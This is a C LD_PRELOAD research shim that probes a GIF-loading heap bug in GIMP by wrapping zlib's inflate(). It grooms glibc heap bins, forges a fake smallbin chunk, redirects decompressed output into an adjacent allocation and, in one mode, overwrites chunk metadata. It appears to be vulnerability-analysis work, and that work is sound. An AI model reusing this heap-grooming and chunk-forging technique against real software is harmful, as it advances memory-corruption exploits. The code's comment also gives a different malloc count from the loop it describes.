/* Bounded live-process consumer probe for CVE-2026-136329.
 *
 * Extends the proven inflate-only LD_PRELOAD pattern (patch-shim.c). Inside
 * the real GIMP 3.2.8 file-gif-load plugin, the wrapped inflate() grooms a
 * shim-owned 260-byte pair B/A (A in the 0x110 smallbin), redirects this one
 * zlib stream into B, then performs ten bounded post-pin malloc(260) calls.
 * RAW_MODE leaves the file-chosen 0x4d metadata; PATCH_MODE writes the
 * W294/W297 live pointer words after zlib has run. The plugin's own indexes
 * chunk is never redirected or freed by the shim. No file byte or returned
 * pointer is dereferenced by this shim; no plugin source is modified.
 *
 * This measures a shim-arranged consumer inside the live process, NOT a
 * natural plugin neighbour, chosen-address write, control flow or command.
 */
#define _GNU_SOURCE
#include <dlfcn.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <zlib.h>
#include <stdarg.h>

typedef int (*inflate_fn) (z_streamp, int);

static inflate_fn real_inflate;
static int armed, redirected;
static unsigned char *pair_B, *pair_A, *saved_out;
static unsigned char fake_area[96] __attribute__((aligned (16)));
static unsigned char *fake_buf;
static void *unsorted_head, *chunk_A, *bin_ptr;
static void *link_slot;

static void
say (const char *fmt, ...)
{
  char line[512];
  va_list ap;
  va_start (ap, fmt);
  int n = vsnprintf (line, sizeof line, fmt, ap);
  va_end (ap);
  if (n > 0)
    {
      if (n >= (int) sizeof line)
        n = sizeof line - 1;
      line[n++] = '\n';
      (void) write (2, line, n);
    }
}

static void
emit (const char *prefix, const unsigned char *p, size_t n)
{
  char line[256];
  int off = snprintf (line, sizeof line, "%s", prefix);
  for (size_t i = 0; i < n && off < (int) sizeof line - 4; i++)
    off += snprintf (line + off, sizeof line - off, "%02x", p[i]);
  line[off++] = '\n';
  (void) write (2, line, off);
}

static int
groom (void)
{
  void *fill[7];


  unsigned char *p1 = NULL, *p2 = NULL;
  ptrdiff_t delta = 0;
  int tries = 0;
  for (; tries < 16; tries++)
    {
      p1 = (unsigned char *) malloc (260);
      p2 = (unsigned char *) malloc (260);
      if (! p1 || ! p2)
        return 0;
      delta = (char *) p2 - (char *) p1;
      if (delta == 272 || delta == -272)
        break;
      free (p1);
      free (p2);
    }
  if (tries == 16)
    {
      say ("SHIM_GROOM_ADJ=0 tries=16 delta=%td", delta);
      return 0;
    }
  if (delta == 272)
    {
      pair_B = p1;
      pair_A = p2;
    }
  else
    {
      pair_B = p2;
      pair_A = p1;
    }
  say ("SHIM_GROOM_TRIES=%d", tries);
  static unsigned char *guard_after;
  guard_after = (unsigned char *) malloc (260); /* keep A off top consolidation */
  if (! guard_after)
    return 0;
  for (int i = 0; i < 7; i++)
    {
      fill[i] = malloc (260);
      if (! fill[i])
        return 0;
    }
  for (int i = 0; i < 7; i++)
    free (fill[i]);                 /* tcache full: A must go to unsorted */
  free (pair_A);
  unsorted_head = *(void **) pair_A;
  /* Keep this allocation live. Freeing it leaves a large unsorted chunk
   * that post-pin mallocs split instead of reaching A in the smallbin. */
  static void *flush_hold;
  flush_hold = malloc (66300);       /* sorts A into the 0x110 smallbin */
  if (! flush_hold)
    return 0;
  (void) flush_hold;

  fake_buf = fake_area + 32;
  chunk_A = (void *) (pair_A - 16);
  bin_ptr = (void *) ((char *) unsorted_head + 0x100);
  memcpy (fake_buf, &chunk_A, sizeof chunk_A);
  /* Shim-owned unlink link: the second smallbin hit requires bk->fd to
   * name the fake chunk. Keep that word in shim memory instead of
   * rewriting a live arena bin head, which broke the plugin's allocator. */
  link_slot = (void *) (fake_buf - 16);
  memcpy (fake_buf + 8, &link_slot, sizeof link_slot);
  size_t fake_sz = 0x111;
  memcpy (fake_area + 24, &fake_sz, sizeof fake_sz);

  say ("SHIM_GROOM_ADJ=1 B=%p A=%p unsorted=%p fake=%p chunkA=%p bin=%p "
       "link=%p delta=%td", (void *) pair_B, (void *) pair_A, unsorted_head,
       (void *) (fake_buf - 16), chunk_A, bin_ptr, (void *) &link_slot,
       (char *) pair_A - (char *) pair_B);

  return 1;
}

int
inflate (z_streamp strm, int flush)
{
  unsigned char *out;
  unsigned long avail;
  int rc;

  if (! real_inflate)
    real_inflate = (inflate_fn) dlsym (RTLD_NEXT, "inflate");
  if (! real_inflate)
    return Z_STREAM_ERROR;

  out = strm ? (unsigned char *) strm->next_out : NULL;
  avail = strm ? (unsigned long) strm->avail_out : 0;
  if (! armed && out && avail > 1000000UL)
    {
      armed = 1;
      if (groom ())
        {
          saved_out = out;
          strm->next_out = pair_B;
          redirected = 1;
        }
    }

  rc = real_inflate (strm, flush);

  if (redirected)
    {
      size_t sz = 0x111; (void) sz;
      strm->next_out = saved_out;   /* pin still owns its indexes pointer */
      redirected = 0;
      emit ("SHIM_BYTES=", pair_B + 264, 24);
#ifdef PATCH_MODE
      say ("SHIM_MODE=patch total_out=%lu", (unsigned long) strm->total_out);
      memcpy (pair_B + 264, &sz, sizeof sz);
      memcpy (pair_B + 272, &unsorted_head, sizeof unsorted_head);
      void *fakechunk = (void *) (fake_buf - 16);
      memcpy (pair_B + 280, &fakechunk, sizeof fakechunk);
#else
      say ("SHIM_MODE=raw total_out=%lu", (unsigned long) strm->total_out);
#endif
      emit ("SHIM_FAKE_BEFORE=", fake_buf, 16);
      for (int k = 0; k < 16; k++)
        {
          say ("SHIM_PRE_MALLOC k=%d", k);
          void *q = malloc (260);
          say ("SHIM_POST_PIN k=%d ptr=%p match_A=%d match_fake=%d", k, q,
               q == (void *) pair_A, q == (void *) (fake_buf - 16));
        }
      emit ("SHIM_FAKE_AFTER=", fake_buf, 16);
    }
  return rc;
}
